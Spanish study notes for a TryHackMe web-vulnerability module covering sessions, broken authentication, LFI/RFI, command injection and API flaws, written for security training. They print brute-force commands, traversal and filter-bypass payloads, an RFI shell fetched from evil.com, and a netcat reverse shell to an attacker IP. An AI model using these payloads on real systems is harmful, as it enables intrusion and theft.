<h1>
  <img src="https://cdn-images.tryhackme.com/modules/web-application-vulnerabilities-ii-1778910839802.svg" width="70px" align="absmiddle">
  <span> WEB APPLICATION VULNERABILITIES II</span>
</h1>

---

> Este módulo lleva su piratería web más allá de los clásicos a las vulnerabilidades que convierten pequeños descuidos en compromisos de sistema completo. Comenzará con la mecánica de la gestión y autenticación de sesiones, luego pasará a los ataques del lado del servidor, como el recorrido de directorios y la inyección de comandos, y terminará con la superficie de ataque en rápida expansión de las API modernas. Un desafío de seguridad en vivo cierra el módulo, por lo que las técnicas se prueban en batalla antes de llevarlas al resto de la ruta.

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/6093e17fa004d20049b6933e-1722528947776" width="60px" align="absmiddle">
  <span> Gestión de Sesiones (Session Management)</span>
</h2>

### 1.1 Introducción y Conceptos de Gestión de Sesiones
La gestión de sesiones es el mecanismo fundamental mediante el cual una aplicación web mantiene el estado de un usuario a lo largo de sus interacciones. Dado que el protocolo HTTP es inherentemente sin estado, cada petición que realiza un cliente es independiente de la anterior. En lugar de exigir que el usuario introduzca su nombre de usuario y contraseña en cada interacción, la aplicación emite un identificador de sesión único tras una autenticación exitosa. Este identificador se transmite en cada solicitud subsiguiente para que el servidor reconozca quién realiza la acción y determine sus permisos asociados. Si la gestión de sesiones está mal implementada, un atacante puede predecir, interceptar o manipular este identificador y secuestrar la cuenta de la víctima.

<br>

### 1.2 Ciclo de Vida de la Gestión de Sesiones
El ciclo de vida de una sesión abarca cuatro fases consecutivas: creación, seguimiento, expiración y terminación. 

La fase de creación de la sesión puede iniciarse incluso antes de que el usuario se autentique, ya que muchas aplicaciones necesitan rastrear a los visitantes anónimos. Sin embargo, en el contexto de sesiones autenticadas, la creación ocurre inmediatamente después de validar las credenciales. El servidor genera un token o valor de sesión que se devuelve al cliente. La seguridad en esta fase depende de que el valor generado sea completamente impredecible y posea suficiente entropía.

La fase de seguimiento de la sesión se ejecuta durante toda la navegación activa. El cliente incluye el identificador de sesión en cada nueva petición HTTP. El servidor recibe este valor, realiza una búsqueda en su base de datos o almacenamiento en memoria (como Redis) y recupera la identidad y los permisos del usuario. Cualquier fallo en la validación durante esta fase puede permitir la suplantación de identidad o el secuestro de la sesión.

La fase de expiración de la sesión aborda el problema de la desconexión pasiva. Como el servidor no puede saber cuándo un usuario cierra el navegador o abandona la pestaña, las sesiones deben tener un tiempo de vida máximo (Time to Live o TTL). Cuando el tiempo de caducidad se alcanza, cualquier petición con ese identificador debe ser rechazada y el usuario debe ser redirigido a la página de inicio de sesión.

La fase de terminación de la sesión ocurre cuando el usuario hace clic de manera explícita en el botón de cierre de sesión. En este momento, la aplicación debe invalidar completamente el identificador en el almacenamiento del servidor. Eliminar la cookie únicamente en el navegador del cliente es insuficiente, ya que si el servidor no destruye el registro interno, la cookie capturada previamente por un atacante seguirá siendo válida indefinidamente.

<br>

### 1.3 Modelo IAAA: Identificación, Autenticación, Autorización y Responsabilidad
Para comprender la seguridad en la gestión de sesiones es imprescindible distinguir los cuatro pilares del modelo IAAA.

La identificación es el acto mediante el cual un usuario proclama quién es dentro del sistema. En la mayoría de las aplicaciones web, esto se realiza introduciendo el nombre de usuario o la dirección de correo electrónico.

La autenticación es el proceso de verificar la veracidad de la identidad proclamada. El usuario proporciona una prueba, como una contraseña, un código OTP o una firma biométrica. Al validar la prueba, la aplicación crea la sesión autenticada.

La autorización es el proceso mediante el cual el sistema verifica si la sesión activa tiene los derechos necesarios para ejecutar la acción solicitada o acceder a un recurso específico. El seguimiento de sesión es el insumo principal del mecanismo de autorización.

La responsabilidad o rendición de cuentas (Accountability) consiste en registrar y auditar las acciones realizadas por cada sesión. En caso de un incidente de seguridad, los registros de auditoría vinculados al identificador de sesión permiten reconstruir la secuencia exacta de eventos e identificar la cuenta comprometida.

<br>

### 1.4 Comparativa Técnica: Cookies frente a Tokens
Existen dos enfoques principales para implementar el seguimiento de sesiones en arquitectura web: la gestión basada en cookies y la gestión basada en tokens.

La gestión basada en cookies representa el método tradicional. El servidor envía el encabezado `Set-Cookie` en la respuesta HTTP tras el inicio de sesión. El navegador almacena la cookie y la adjunta automáticamente en todas las peticiones posteriores dirigidas al mismo dominio. Para proteger estas cookies, se deben aplicar atributos de seguridad esenciales. El atributo `Secure` exige que la cookie solo se transmita a través de conexiones cifradas HTTPS. El atributo `HttpOnly` impide que el código JavaScript del cliente acceda al valor de la cookie mediante `document.cookie`, bloqueando el robo de sesión ante vulnerabilidades XSS. El atributo `Expires` o `Max-Age` fija la caducidad temporal. El atributo `SameSite` (configurado en `Strict` o `Lax`) controla si la cookie se envía en peticiones entre sitios, siendo la defensa primaria contra ataques CSRF. La principal desventaja de las cookies radica en que al enviarse automáticamente, son vulnerables a CSRF si no se aplican los atributos adecuados o tokens de sincronización.

La gestión basada en tokens es el estándar en aplicaciones web modernas y arquitecturas desacopladas (SPA y APIs). Tras la autenticación, el servidor devuelve un token en el cuerpo de la respuesta JSON (comúnmente un JSON Web Token o JWT). El código JavaScript del cliente recibe el token y lo almacena manualmente en el `LocalStorage` o `SessionStorage` del navegador. En cada petición posterior, el script carga el token y lo añade explícitamente en el encabezado `Authorization: Bearer <TOKEN>`. La ventaja principal de los tokens es que eliminan los ataques CSRF tradicionales, ya que el navegador no añade el encabezado de forma automática. Sin embargo, como los tokens almacenados en `LocalStorage` son totalmente accesibles desde JavaScript, cualquier vulnerabilidad XSS permite a un atacante leer el token directamente e impersonar al usuario de forma inmediata.

<br>

### 1.5 Aseguramiento del Ciclo de Vida y Vulnerabilidades Comunes
Durante la fase de creación de la sesión, las vulnerabilidades surgen al utilizar algoritmos de generación débiles o predecibles, como codificar simplemente el nombre de usuario en Base64 o utilizar marcas de tiempo secuenciales. Otra falla crítica es la fijación de sesión (Session Fixation), que ocurre cuando la aplicación asigna una cookie de sesión a un usuario anónimo y no la renueva tras un inicio de sesión exitoso. Si un atacante induce a la víctima a usar un identificador conocido antes de autenticarse, mantendrá acceso a la cuenta una vez que la víctima introduzca sus credenciales. Asimismo, en arquitecturas de Inicio de Sesión Único (SSO), las redirecciones no seguras tras la autenticación pueden filtrar el token de sesión hacia servidores de terceros controlados por atacantes.

Durante la fase de seguimiento, las fallas de autorización permiten la escalada vertical (ejecutar funciones administrativas desde una cuenta estándar) y la escalada horizontal (acceder a datos de otros usuarios con el mismo nivel de privilegios). En la expiración y terminación, los problemas provienen de establecer tiempos de vida excesivamente largos o descuidar la invalidación del lado del servidor al cerrar sesión o restablecer la contraseña, lo que otorga acceso persistente a los atacantes que hayan capturado previamente la sesión.

<br>

### 1.6 Práctica Operativa de Auditoría de Sesiones
Para auditar la gestión de sesiones en una aplicación web, se debe inspeccionar el tráfico con las herramientas de desarrollador del navegador o Burp Suite. Primero se verifica si la aplicación emite cookies antes del login y si la cookie cambia tras autenticarse (prueba de fijación de sesión). A continuación, se examinan las banderas `HttpOnly`, `Secure` y `SameSite` en la pestaña de almacenamiento de cookies. Posteriormente, se prueba la terminación de sesión copiando el valor de la cookie, cerrando sesión en la aplicación web, y realizando una nueva petición HTTP pegando manualmente la cookie antigua en el encabezado `Cookie`. Si el servidor devuelve una respuesta 200 OK con contenido privado en lugar de redirigir al login, la sesión no fue invalidada en el backend.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779264024237" width="60px" align="absmiddle">
  <span> Autenticación Rota (Broken Authentication)</span>
</h2>

### 2.1 Introducción y Concepto
La autenticación rota agrupa las vulnerabilidades que permiten a un atacante anular o eludir los mecanismos de verificación de identidad de una aplicación web, logrando acceder a cuentas de otros usuarios sin conocer sus credenciales legítimas. Estas fallas surgen cuando los desarrolladores asumen que los usuarios interactuarán con la aplicación únicamente de la forma prevista gráfica o cuando la lógica del backend confía en datos enviados por el cliente sin una validación independiente en el servidor.

<br>

### 2.2 Tipos Principales de Bypasses de Autenticación
Los ataques contra los sistemas de autenticación se dividen en cuatro categorías fundamentales: enumeración de nombres de usuario, fuerza bruta de credenciales, fallos lógicos en los flujos de recuperación y manipulación directa de cookies de sesión.

La enumeración de nombres de usuario busca construir una lista confirmada de cuentas existentes en el objetivo. La fuerza bruta utiliza dicha lista para probar sistemáticamente diccionarios de contraseñas. Los fallos lógicos explotan inconsistencias en procesos como el restablecimiento de clave para redirigir los enlaces de recuperación. La manipulación de cookies altera los valores de estado almacenados en el navegador cuando el servidor no valida su integridad criptográfica.

<br>

### 2.3 Impacto Operativo y Casos de Uso
El impacto de comprometer la autenticación depende de la cuenta accedida. El acceso a una cuenta de cliente permite la exfiltración de datos personales, historial financiero y modificación de perfil. El acceso a una cuenta administrativa otorga el control total sobre la aplicación, permitiendo alterar bases de datos, subir archivos maliciosos y lograr la ejecución remota de código (RCE). Además, las credenciales obtenidas se utilizan habitualmente en ataques de relleno de credenciales (Credential Stuffing) contra otros servicios de Internet donde los usuarios reutilizan la misma contraseña.

<br>

### 2.4 Enumeración de Nombres de Usuario
La enumeración es posible cuando la aplicación trata de manera diferente las solicitudes enviadas con nombres de usuario registrados en comparación con los no registrados. El vector más común se encuentra en los formularios de registro o inicio de sesión que devuelven mensajes de error explícitos, como "El nombre de usuario ya está registrado" frente a "Registro exitoso".

Incluso cuando los mensajes de texto son idénticos, la presencia de cuentas válidas puede confirmarse analizando discrepancias sutiles en los encabezados de respuesta, el código de estado HTTP (200 OK frente a 404 o 400), la longitud en bytes de la respuesta o el tiempo de procesamiento del servidor.

Para automatizar la enumeración se utiliza la herramienta `ffuf`. El siguiente comando realiza peticiones POST contra un formulario de registro inyectando un diccionario de usuarios en el parámetro `username` y filtrando las respuestas mediante una expresión regular que busca el mensaje de cuenta existente:

```bash
ffuf -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=test@demo.com&password=Password123" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.10/signup -mr "El nombre de usuario ya esta registrado"
```

Los usuarios identificados se guardan en un archivo `valid_usernames.txt` para alimentar la siguiente fase del ataque.

<br>

### 2.5 Fuerza Bruta en Formularios de Login
Con una lista reducida de usuarios válidos, la fuerza bruta se vuelve altamente eficiente. En lugar de probar miles de usuarios desconocidos, se prueban combinaciones de los usuarios confirmados contra un diccionario de contraseñas habituales (como `rockyou.txt`).

Para ejecutar un ataque de fuerza bruta cruzando dos diccionarios independientes con `ffuf`, se definen dos marcadores de posición (`W1` para usuarios y `W2` para contraseñas). El siguiente comando envía cada combinación y filtra las respuestas con código HTTP 200, dejando visibles únicamente las respuestas con código 302 que indican un inicio de sesión exitoso y redirección al panel interno:

```bash
ffuf -w valid_usernames.txt:W1 -w /usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.10.10/login -fc 200
```

<br>

### 2.6 Fallos Lógicos en la Autenticación
Los fallos lógicos se producen por incoherencias entre componentes de la aplicación. Un ejemplo clásico es la discrepancia en la comparación de rutas. Si el enrutador del servidor web no distingue entre mayúsculas y minúsculas y dirige `/adMin` al mismo controlador que `/admin`, pero el filtro de seguridad realiza una comparación de cadenas estricta sensible a mayúsculas (`=== '/admin'`), la petición a `/adMin` eludirá la comprobación de seguridad y entregará el panel administrativo sin autenticación.

Otro fallo crítico ocurre en los flujos de restablecimiento de contraseña mediante contaminación de parámetros HTTP (HTTP Parameter Pollution). Supongamos que la aplicación solicita la cuenta objetivo en la URL (`GET /reset?email=victim@target.com`) y el nombre de usuario en el cuerpo POST (`username=victim`). Si el backend procesa las entradas combinando la cadena de consulta y el cuerpo POST en un arreglo superglobal (como `$_REQUEST` en PHP), un atacante puede inyectar un segundo parámetro `email` en el cuerpo POST:

```http
POST /reset?email=victim@target.com HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&username=victim
```

Si la lógica de verificación valida la existencia de la cuenta leyendo el parámetro de la URL, pero genera y envía el correo con el token de recuperación leyendo el parámetro del cuerpo POST, el enlace de restablecimiento de la cuenta de la víctima será enviado directamente a la bandeja de entrada del atacante.

<br>

### 2.7 Manipulación de Cookies de Sesión
Cuando el estado de autenticación se almacena en cookies no firmadas criptográficamente, el cliente puede editar su contenido para alterar las decisiones del servidor.

En las cookies de texto plano, parámetros como `logged_in=false; admin=false` pueden modificarse directamente en las herramientas del navegador a `logged_in=true; admin=true` para obtener privilegios administrativos inmediatamente.

En las cookies basadas en hashes, el servidor almacena el hash de un valor conocido (por ejemplo, el hash MD5 del ID de usuario `1`, que equivale a `c4ca4238a0b923820dcc509a6f75849b`). Aunque el hash es unidireccional, no es una firma. Un atacante puede calcular el hash MD5 del ID de usuario `2` de forma independiente y reemplazar el valor de la cookie para suplantar la identidad de dicho usuario.

En las cookies codificadas (como Base64), los datos estructurados JSON suelen estar traducidos para viajar por HTTP. Al recibir la cookie `eyJpZCI6MiwgImFkbWluIjpmYWxzZX0=`, su decodificación revela `{"id":2, "admin":false}`. El atacante puede modificar la cadena JSON a `{"id":2, "admin":true}`, codificarla nuevamente en Base64 (`eyJpZCI6MiwgImFkbWluIjp0cnVlfQ==`) y enviarla en el encabezado `Cookie` para asumir privilegios elevados.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/5e2656cb5a909ddf63395dd7e7a377ad.png" width="60px" align="absmiddle">
  <span> Inclusión de Archivos (File Inclusion - LFI / RFI)</span>
</h2>

### 3.1 Introducción y Riesgos Operativos
Las vulnerabilidades de inclusión de archivos ocurren cuando una aplicación web utiliza entradas proporcionadas por el usuario para construir rutas hacia archivos que deben ser cargados o procesados por el servidor, sin realizar la validación ni el saneamiento adecuado. Estas fallas se encuadran en el OWASP Top 10 bajo control de acceso roto (A01), inyección (A03) y configuraciones de seguridad erróneas (A05). Los riesgos varían desde la lectura no autorizada de código fuente y archivos sensibles del sistema hasta la ejecución remota de código (RCE) completa sobre el servidor backend.

<br>

### 3.2 Salto de Directorio (Path Traversal / Directory Traversal)
El salto de directorio es una vulnerabilidad que permite a un atacante navegar a través de la estructura del sistema de archivos del servidor para leer archivos ubicados fuera del directorio raíz web de la aplicación. Ocurre cuando la entrada del usuario se pasa directamente a funciones de lectura de archivos como `file_get_contents()` en PHP. La secuencia `../` (dos puntos y una barra) le indica al sistema operativo que ascienda un nivel en el árbol de directorios. Al concatenar múltiples secuencias `../../../../`, el atacante escapa del directorio de la aplicación web y alcanza la raíz `/` del sistema de archivos, pudiendo descender hacia archivos del sistema como `/etc/passwd`. En sistemas Windows, la sintaxis utiliza la barra invertida `..\..` o la barra diagonal, permitiendo alcanzar la raíz de la unidad `C:\` para leer archivos del sistema como `C:oot.ini` o `C:\Windows\win.ini`.

Entre los archivos objetivo más críticos para auditar mediante Path Traversal destacan el archivo `/etc/passwd` para la lista de usuarios del sistema, `/etc/shadow` para hashes de contraseñas de usuarios con privilegios elevados, `/etc/issue` y `/proc/version` para información del sistema operativo y versión del kernel, `/root/.ssh/id_rsa` para claves privadas SSH de acceso directo, y los archivos `/var/log/apache2/access.log` o `/var/log/nginx/access.log` para registros del servidor web útiles en ataques de Log Poisoning.

<br>

### 3.3 Inclusión de Archivos Locales (LFI - Local File Inclusion)
A diferencia del Path Traversal donde el archivo únicamente se lee y se devuelve como texto plano, en la Inclusión de Archivos Locales (LFI) el archivo seleccionado es procesado e interpretado por el lenguaje de programación del servidor a través de funciones como `include()`, `require()`, `include_once()` o `require_once()` en PHP. Esto significa que si el archivo incluido contiene código ejecutable (como etiquetas PHP `<?php ... ?>`), el servidor lo ejecutará antes de enviar la respuesta al cliente.

En el primer escenario de LFI sin directorio prefijado en el código fuente (`include($_GET['page']);`), la aplicación no añade ninguna ruta estática. El atacante puede proporcionar directamente una ruta absoluta hacia cualquier archivo del sistema, como `http://target.com/index.php?page=/etc/passwd`, logrando que la función procese y muestre el archivo.

En el segundo escenario de LFI con directorio prefijado en el código fuente (`include("languages/" . $_GET['lang']);`), el desarrollador intenta restringir la carga al directorio `languages/`. Sin embargo, el atacante puede inyectar secuencias de salto de directorio en el parámetro para salir de dicha carpeta, como `http://target.com/index.php?lang=../../../../etc/passwd`. El servidor resolverá la ruta interna como `languages/../../../../etc/passwd`, la cual navega fuera de la carpeta y accede exitosamente al archivo objetivo.

<br>

### 3.4 Pruebas de Caja Negra y Bypasses de Filtros en LFI
Durante auditorías de caja negra sin acceso al código fuente, los mensajes de error devueltos por la aplicación revelan la estructura interna. Un mensaje como `Warning: include(languages/test.php): failed to open stream` revela que la aplicación agrega el prefijo `languages/` y la extensión `.php` a la entrada.

En versiones antiguas de PHP (anteriores a la 5.3.4), la adición automática de la extensión `.php` se evadía utilizando el byte nulo (`%00`). Al enviar `http://target.com/index.php?lang=../../../../etc/passwd%00`, el carácter nulo le indicaba a la biblioteca de C subyacente que finalizara la cadena en ese punto, ignorando la extensión `.php` concatenada posteriormente por el código.

Cuando los desarrolladores aplican filtros de palabras clave para bloquear rutas conocidas como `/etc/passwd`, es posible eludir la restricción añadiendo la secuencia de directorio actual `/.` al final de la ruta. La solicitud `http://target.com/index.php?lang=../../../../etc/passwd/.` evita la coincidencia exacta de la cadena bloqueada por el filtro, pero el sistema de archivos resuelve la ruta devolviendo el contenido de `/etc/passwd`.

Si la defensa aplicada consiste en eliminar la secuencia `../` de la entrada mediante un reemplazo de una sola pasada (`str_replace('../', '', $input)`), el filtro destruye el patrón inicial pero no vuelve a validar el resultado final. El atacante puede eludir esta protección duplicando la secuencia inyectando `....//`. Cuando el servidor elimina la cadena `../` interna de `....//`, los caracteres restantes se unen formando nuevamente un `../` válido.

Si el servidor exige obligatoriamente que la entrada comience con un prefijo de directorio específico (por ejemplo, validar que el parámetro empiece por `languages/`), el atacante incluye dicho prefijo al inicio del payload y añade inmediatamente las secuencias de salto: `http://target.com/index.php?lang=languages/../../../../etc/passwd`.

<br>

### 3.5 Inclusión de Archivos Remotos (RFI - Remote File Inclusion)
La Inclusión de Archivos Remotos (RFI) ocurre cuando la función de inclusión de la aplicación acepta direcciones URL completas que apuntan a servidores externos. En lugar de procesar un archivo alojado localmente en el servidor víctima, la aplicación realiza una petición HTTP saliente hacia un servidor controlado por el atacante, descarga el archivo malicioso y ejecuta su código en el backend. Para que RFI sea explotable en PHP, la configuración del archivo `php.ini` debe tener habilitada la directiva `allow_url_fopen` (y en versiones antiguas `allow_url_include`).

El flujo operativo de un ataque RFI comienza cuando el atacante aloja un archivo ejecutable malicioso como `cmd.txt` en su propio servidor web con contenido tipo `<?php system($_GET['cmd']); ?>`. A continuación, el atacante envía una petición HTTP inyectando la URL completa en el parámetro vulnerable: `GET /index.php?page=http://evil.com/cmd.txt&cmd=id`. El servidor víctima recibe la petición, realiza una solicitud GET hacia `evil.com/cmd.txt`, descarga el código PHP y lo ejecuta inmediatamente en el intérprete del servidor, devolviendo al atacante el resultado de la ejecución del comando `id`.

<br>

### 3.6 Metodología de Auditoría para File Inclusion
Para auditar vulnerabilidades de inclusión de archivos en una aplicación web se debe seguir una metodología ordenada. En primer lugar, se identifican todos los parámetros de entrada que acepten nombres de archivos o rutas en URLs, cuerpos POST, cookies y encabezados HTTP. En segundo lugar, se analiza el comportamiento normal enviando valores válidos y registrando la respuesta devuelta. En tercer lugar, se inyectan caracteres especiales y secuencias de salto (`../`, `..\`, `/etc/passwd`) observando los mensajes de error técnicos devueltos. En cuarto lugar, se identifican los filtros aplicados como adición de extensiones, eliminación de caracteres o prefijos obligatorios. En quinto lugar, se construye el payload específico aplicando las técnicas de evasión correspondientes como duplicación de secuencias, byte nulo o agregado de `/.`. Finalmente, en caso de confirmar LFI, se prueban técnicas de escalada a RCE como Log Poisoning (inyectando código PHP en el encabezado `User-Agent` y cargando los archivos de registro de Apache/Nginx) o uso de envoltorios PHP como `php://filter` para leer código fuente en Base64 o `php://input` para enviar código en el cuerpo POST.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/a72f3f1c0445bac396659c36a1e8c355.png" width="60px" align="absmiddle">
  <span> Inyección de Comandos (Command Injection)</span>
</h2>

### 4.1 Introducción y Diferenciación Técnica
La inyección de comandos en el sistema operativo (OS Command Injection) ocurre cuando una aplicación web toma datos proporcionados por el usuario y los concatena directamente dentro de una llamada del sistema que ejecuta comandos de la consola del servidor backend, sin el debido saneamiento ni parametrización. Esta vulnerabilidad se clasifica en el OWASP Top 10 bajo A05: Inyección y corresponde a la categoría CWE-78.

Es crucial diferenciar la Inyección de Comandos de la Ejecución Remota de Código (RCE). RCE es el impacto o resultado final donde un atacante logra ejecutar código arbitrario en un entorno remoto. La Inyección de Comandos es una técnica específica para lograr RCE mediante la manipulación del interprete de comandos del sistema operativo (`sh`, `bash`, `cmd.exe`, `powershell.exe`). Los comandos inyectados se ejecutan con los mismos privilegios del proceso que aloja la aplicación web (por ejemplo, el usuario `www-data` o `apache`).

<br>

### 4.2 Descubrimiento de Código Vulnerable
La vulnerabilidad surge cuando los lenguajes de programación utilizan funciones integradas para invocar la consola del sistema operativo pasando cadenas no desinfectadas.

En PHP, las funciones vulnerables habituales son `exec()`, `system()`, `shell_exec()`, `passthru()` y el operador de comillas invertidas (`` `cmd` ``). En Python, el módulo `subprocess` con `shell=True` o las funciones `os.system()` y `os.popen()` representan los vectores principales. En Node.js, las funciones del módulo `child_process` como `exec()` e `execSync()` son los puntos de riesgo.

A continuación se analiza un ejemplo explicativo en código PHP vulnerable que realiza búsquedas de canciones mediante la herramienta de consola `grep`:

```php
<?php
  // Entrada recibida directamente de la URL sin saneamiento
  $title = $_GET['title'];
  
  // Concatenación directa de la entrada en el comando de consola
  $command = "grep " . $title . " /var/www/html/songtitle.txt";
  
  // Ejecución directa en el sistema operativo
  exec($command, $output);
?>
```

Si el usuario envía un título legítimo como `Yesterday`, el sistema ejecuta `grep Yesterday /var/www/html/songtitle.txt`. Sin embargo, si el usuario envía `; cat /etc/passwd`, el comando construido se transforma en `grep ; cat /etc/passwd /var/www/html/songtitle.txt`. La consola interpreta el punto y coma `;` como un separador e invoca el comando `cat`, devolviendo el archivo de contraseñas del sistema.

<br>

### 4.3 Explotación de Inyección de Comandos
La explotación se basa en utilizar operadores del interprete de comandos (*shell operators*) para encadenar instrucciones adicionales. El punto y coma `;` en Linux ejecuta el segundo comando secuencialmente sin importar si el primero tuvo éxito. El operador `&&` ejecuta el segundo comando únicamente si el primero finalizó con éxito. El operador `||` ejecuta el segundo comando únicamente si el primero falló. El ampersand `&` ejecuta el primer comando en segundo plano e inicia inmediatamente el segundo. La tubería `|` redirige la salida del primer comando como entrada del segundo.

Existen dos modalidades principales de inyección de comandos: verbosa y ciega.

En la Inyección de Comandos Verbosa (Verbose Command Injection), la aplicación captura la salida estándar del comando ejecutado y la imprime directamente en la respuesta HTTP devuelta al navegador. La verificación es inmediata al inyectar `; whoami` y observar el nombre del usuario en pantalla.

En la Inyección de Comandos Ciega (Blind Command Injection), el comando se ejecuta en el servidor pero la aplicación no devuelve ninguna salida gráfica en la respuesta HTTP. Para confirmar la vulnerabilidad se utilizan pruebas basadas en tiempo mediante los comandos `ping` o `sleep`. Inyectar `; ping -c 10 127.0.0.1` en Linux o `; ping -n 10 127.0.0.1` en Windows obliga al servidor a pausar su respuesta durante aproximadamente 10 segundos, confirmando la ejecución.

Otra técnica para la inyección ciega consiste en redirigir la salida hacia un archivo dentro de la raíz web utilizando el operador `>` (ejemplo `; whoami > /var/www/html/out.txt`) y acceder posteriormente al archivo creado mediante el navegador en `http://target.com/out.txt`. Asimismo, se pueden realizar pruebas mediante la herramienta `curl` para enviar las peticiones con los payloads incrustados directamente en las variables de la URL:

```bash
curl -i -s "http://target.com/search.php?title=%3B%20whoami"
```

<br>

### 4.4 Payloads Útiles por Sistema Operativo
Dependiendo del sistema operativo del servidor objetivo, se emplean distintos comandos para el reconocimiento y la exfiltración.

En sistemas Linux, el comando `whoami` identifica el usuario ejecutor, `id` muestra el UID y grupos de seguridad, `uname -a` revela detalles del kernel, `ls -la` lista todos los archivos del directorio actual incluyendo ocultos, `cat /etc/passwd` expone la lista de cuentas del sistema, `ping -c 5 127.0.0.1` o `sleep 5` pausan la respuesta para confirmar inyección ciega, y `nc -e /bin/bash ATACANTE_IP PUERTO` inicia una conexión de shell inverso hacia la máquina del auditor.

En sistemas Windows, el comando `whoami` identifica el usuario y dominio, `whoami /priv` expone los privilegios asignados al token del usuario actual para detectar vectores de escalada, `dir` lista los archivos y directorios del entorno actual, `ipconfig /all` muestra las interfaces y configuración IP, y `ping -n 5 127.0.0.1` o `timeout /t 5` pausan la respuesta para confirmar inyección ciega.

<br>

### 4.5 Remedación y Evasión de Filtros
La remediación definitiva consiste en evitar la ejecución de comandos del sistema operativo a través del shell. En su lugar, se deben utilizar funciones o APIs nativas del lenguaje de programación. Si el uso de comandos del sistema es estrictamente inevitable, la entrada del usuario nunca debe concatenarse en la cadena de comandos. Se deben utilizar funciones que acepten un arreglo de argumentos independientes (como `subprocess.run(["grep", title, "file.txt"], shell=False)` en Python), donde el intérprete trata cada elemento estrictamente como un dato y no como código ejecutable.

Asimismo, se deben aplicar validaciones estrictas en el servidor mediante listas de permitidos (*allowlists*). Por ejemplo, en PHP se puede utilizar `filter_input` para forzar que el parámetro sea exclusivamente un número entero o una cadena alfanumérica sin caracteres especiales:

```php
<?php
  // Validar que la entrada sea exclusivamente un entero numerico
  $id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
  if ($id === false) {
      die("Entrada no valida");
  }
  // Procesamiento seguro...
?>
```

Cuando los desarrolladores intentan sanear las entradas mediante listas negras que eliminan palabras clave o caracteres especiales (como espacios o barras), los atacantes evitan las restricciones utilizando codificaciones alternativas. Por ejemplo, si el servidor bloquea la cadena `/etc/passwd`, el atacante puede enviar la representación hexadecimal equivalente de la ruta, logrando que el filtro la deje pasar pero que el interprete subyacente la ejecute correctamente tras la decodificación.

<br>

---

<br>

<h2>
  <img src="https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1779263884488" width="60px" align="absmiddle">
  <span> Pentesting de APIs (API Pentesting)</span>
</h2>

## 5. Pentesting de APIs (API Pentesting)

### 5.1 Introducción al Pentesting de APIs
Una Interfaz de Programación de Aplicaciones (API) es una estructura de comunicación que permite la interacción de datos entre diferentes componentes de software. En las arquitecturas modernas, las APIs constituyen la columna vertebral del backend, sirviendo simultáneamente a aplicaciones web, aplicaciones móviles e integraciones de terceros. A diferencia de las aplicaciones web tradicionales que devuelven páginas HTML completas formateadas para humanos, las APIs intercambian datos ligeros en formato JSON o XML.

Desde la perspectiva de las pruebas de seguridad, las APIs presentan una superficie de ataque única. No existe una interfaz de usuario gráfica (GUI) que limite la interacción; no hay botones ni formularios visuales. El auditor interactúa directamente con los puntos finales (*endpoints*) sin procesar mediante herramientas como Burp Suite, Postman o Insomnia. Esta interacción directa permite enviar cualquier estructura de datos manipulada, abriendo vulnerabilidades específicas como la Autorización de Nivel de Objeto Rota (BOLA) y la Asignación Masiva (Mass Assignment).

<br>

### 5.2 Funcionamiento de las APIs RESTful
El estilo arquitectónico más extendido es REST (Representational State Transfer). Las APIs RESTful organizan la información en torno al concepto de recursos (como usuarios, productos o pedidos). Cada recurso se identifica mediante una URL única y predecible denominada punto final o *endpoint* (por ejemplo, `/v1/users` o `/v1/orders/1045`).

Las APIs RESTful emplean los métodos HTTP estándar para ejecutar operaciones CRUD. El método `GET` recupera recursos sin modificar datos. El método `POST` crea nuevos recursos o procesa datos. El método `PUT` reemplaza completamente un recurso existente. El método `PATCH` modifica parcialmente únicamente los campos especificados en el cuerpo JSON. El método `DELETE` elimina el recurso del servidor.

Cada respuesta de la API incluye un código de estado HTTP que indica el resultado de la operación. El código `200 OK` o `201 Created` indica procesamiento o creación exitosa. El código `400 Bad Request` señala una petición malformada útil para auditar validaciones. El código `401 Unauthorized` indica falta de autenticación o token no válido. El código `403 Forbidden` confirma que el usuario está autenticado pero no tiene permisos para el recurso. El código `404 Not Found` indica que el recurso no existe. El código `429 Too Many Requests` confirma la activación de mecanismos de limitación de tasa (*rate limiting*). El código `500 Internal Server Error` señala fallos internos del servidor aprovechables para inyecciones o errores lógicos.

Para la autenticación, las APIs utilizan tres esquemas principales: Claves de API (claves estáticas enviadas en encabezados como `X-API-Key`), Tokens Bearer (tokens de sesión temporales) y JSON Web Tokens (JWT). Un JWT consta de tres partes codificadas en Base64 separadas por puntos: el encabezado (algoritmo utilizado), la carga útil o *payload* (reclamaciones como `user_id`, `role` y `exp`), y la firma criptográfica. Es crucial recordar que la carga útil de un JWT no está cifrada, solo codificada, por lo que cualquier persona en posesión del token puede decodificarla y leer su contenido.

<br>

### 5.3 Autorización de Nivel de Objeto Rota (BOLA / IDOR en APIs)
La Autorización de Nivel de Objeto Rota (BOLA - Broken Object Level Authorization) ocupa la primera posición en el OWASP API Security Top 10. Es el equivalente a las Referencias Directas Inseguras a Objetos (IDOR) en aplicaciones web tradicionales.

BOLA ocurre cuando un punto final de la API recibe un identificador de objeto en la petición (en la URL, en la cadena de consulta o en el cuerpo JSON) y devuelve o modifica el recurso sin verificar si el usuario autenticado que realiza la solicitud es el propietario legítimo de dicho recurso.

Dado que las APIs RESTful utilizan URLs altamente predecibles (como `GET /v1/users/4/orders`), un atacante autenticado como el usuario `4` puede modificar el identificador en la URL a `GET /v1/users/1/orders`. Si la API se limita a verificar la validez del token de sesión pero no comprueba si el `user_id` del token coincide con el `user_id` de la ruta, devolverá los datos privados del usuario `1`.

